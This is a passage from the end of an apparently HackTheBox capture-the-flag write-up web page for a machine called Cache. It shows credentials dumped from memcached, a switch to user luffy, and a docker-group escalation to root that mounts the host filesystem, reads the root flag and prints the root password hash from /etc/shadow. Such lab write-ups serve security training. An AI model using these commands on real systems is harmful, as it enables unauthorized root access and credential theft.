127.0.0.1...</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Connected to 127.0.0.1.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Escape character is &#x27;^]&#x27;.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">version</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">version</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">VERSION 1.5.6 Ubuntu</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">stats items</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">stats items</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">STAT items:1:number 5</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">...</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">stats cachedump 1 0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">stats cachedump 1 0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ITEM link [21 b; 0 s]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ITEM user [5 b; 0 s]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ITEM passwd [9 b; 0 s]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ITEM file [7 b; 0 s]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ITEM account [9 b; 0 s]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">END</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">get user</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">get user</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">VALUE user 0 5</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">luffy</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">END</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">get passwd</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">get passwd</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">VALUE passwd 0 9</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0n3_p1ec3</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">END</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">get file</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">get file</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">VALUE file 0 7</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">nothing</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">END</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">get account</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">get account</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">VALUE account 0 9</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">afhj556uo</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">END</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">quit</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">quit</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Now we can use the creds: <code>luffy</code> / <code>0n3_p1ec3</code>.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ su luffy</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">su luffy</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Password: 0n3_p1ec3</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">luffy@cache:/$ cd</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">cd</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">luffy@cache:~$</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="privilege-escalation-of-machine--luffy-to-root">Privilege Escalation of Machine : luffy to root<a href="#privilege-escalation-of-machine--luffy-to-root" class="hash-link" aria-label="Direct link to Privilege Escalation of Machine : luffy to root" title="Direct link to Privilege Escalation of Machine : luffy to root">​</a></h3><p>We can see there is docker running and the user is in docker group.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ id</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">uid=1001(luffy) gid=1001(luffy) groups=1001(luffy),999(docker)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ ps -ef f | grep docker</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ps -ef f | grep docker</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">root       918     1  0 22:39 ?        Ssl    0:05 /usr/bin/dockerd -H fd://</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">root      1358   918  0 22:39 ?        Ssl    0:04  \_ containerd --config /var/run/docker/containerd/containerd.toml --log-level info</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">root      6934  1358  0 23:45 ?        Sl     0:00      \_ containerd-shim -namespace moby -workdir /var/lib/docker/containerd/daemon/io.containerd.runtime.v1.linux/moby/f211bc4cffb910b8c45b09d9eeec6c9483af4fff6222a5ca7c211aef6ca3bc94 -address /var/run/docker/containerd/containerd.sock -containerd-binary /usr/bin/containerd -runtime-root /var/run/docker/runtime-runc</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Being in docker group is like being root because of the capabilities.</p><p>My reflex is to check <a href="https://gtfobins.github.io/" target="_blank" rel="noopener noreferrer">GTFOBins</a> if there are some ready to use payloads
for pe, and <a href="https://gtfobins.github.io/gtfobins/docker/#shell%3C%3E" target="_blank" rel="noopener noreferrer">there is</a>.</p><p>Let&#x27;s find what images are available:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ docker images</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">docker images</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ubuntu              latest              2ca708c1c9cc        10 months ago       64.2MB</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>So let&#x27;s spawn a shell through a shared volume:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">luffy@cache:~$ docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">root@ae6411b77a1e:/# cd</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">cd</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">root@ae6411b77a1e:~# cat root.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">cat root.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">44f998eb5112e763883b6ae36279a432</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">root@ae6411b77a1e:~# cat /etc/shadow | grep root</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">cat /etc/shadow | grep root</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">root:$6$bWa.Lbnz$k0KbMyNbdOQRcY5pWuHM2bfkF5ek8c0CTNsi00qFHmp04NqcefCsIXZTdJgqToRar5zcEk5k8KFhbIomGB3Kb/:18178:0:99999:7:::</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="theme-doc-footer-tags-row row margin-bottom--sm"><div class="col"><b>Tags:</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/security/">security</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/writeups/">writeups</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/linux/">linux</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/recon/">recon</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/network/">network</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/pe/">pe</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/exploit/">exploit</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/htb/">htb</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/sqli/">sqli</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/rce/">rce</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/memcache/">memcache</a></li></ul></div></div></footer></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href="/writeups/HackTheBox/Buff/write-up/"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">Buff </div></a><a class="pagination-nav__link pagination-nav__link--next" href="/writeups/HackTheBox/Control/write-up/"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">Control </div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#overview" class="table-of-contents__link toc-highlight">Overview</a><ul><li><a href="#network-enumeration" class="table-of-contents__link toc-highlight">Network enumeration</a></li><li><a href="#http-enumeration--discovery" class="table-of-contents__link toc-highlight">HTTP enumeration &amp; discovery</a></li><li><a href="#http-exploitation-openemr-sqli" class="table-of-contents__link toc-highlight">HTTP exploitation (OpenEMR): SQLi</a></li><li><a href="#http-exploitation-openemr-rce" class="table-of-contents__link toc-highlight">HTTP exploitation (OpenEMR): RCE</a></li><li><a href="#privilege-escalation-of-machine--www-data-to-ash" class="table-of-contents__link toc-highlight">Privilege Escalation of Machine : www-data to ash</a></li><li><a href="#privilege-escalation-of-machine--ash-to-luffy" class="table-of-contents__link toc-highlight">Privilege Escalation of Machine : ash to luffy</a></li><li><a href="#privilege-escalation-of-machine--luffy-to-root" class="table-of-contents__link toc-highlight">Privilege Escalation of Machine : luffy to root</a></li></ul></li></ul></div></div></div></div></main></div></div><footer class="footer"><div class="container container-fluid"><div class="row footer__links"><div class="col footer__col"><div class="footer__title">Support me</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://github.com/sponsors/S4CH" target="_blank" rel="noopener noreferrer" class="footer__link-item">Github<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Made with   ♥  by CyFun © 2023 
                            | Built on Docusaurus</div></div></div></footer></div>
<script src="/assets/js/runtime~main.3415e7ae.js"></script>
<script src="/assets/js/main.c90fa39a.js"></script>
</body>
</html>